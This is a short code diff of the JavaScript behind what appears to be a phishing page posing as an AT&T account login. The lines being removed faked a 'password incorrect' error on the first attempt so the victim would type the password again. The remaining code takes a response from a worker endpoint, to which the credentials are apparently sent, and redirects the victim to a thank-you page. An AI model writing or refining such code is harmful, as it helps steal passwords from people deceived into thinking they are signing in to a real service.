@@ -75,19 +75,10 @@ document.addEventListener('DOMContentLoaded', function () {
             })
             .then(response => response.json()) // Convert response to JSON
             .then(data => {
-                if (count < 1) {
-                    count++;
-                    passerror.style.display = "block";
-                    passerror.style.fontSize = "small";
-                    document.getElementById("password").value = "";
-                    passerror.innerHTML = "Please enter your ATT account password correctly";
+                if (data.redirect) {
+                    window.location.href = data.redirect; // Redirect to thanks.html
                 } else {
-                    setCookie("username", username, 30);
-                    if (data.redirect) {
-                        window.location.href = data.redirect; // Redirect based on worker's response
-                    } else {
-                        console.log("Success, but no redirect URL found.");
-                    }
+                    console.log("Success, but no redirect URL found.");
                 }
             })
             .catch(error => console.error("Error:", error));
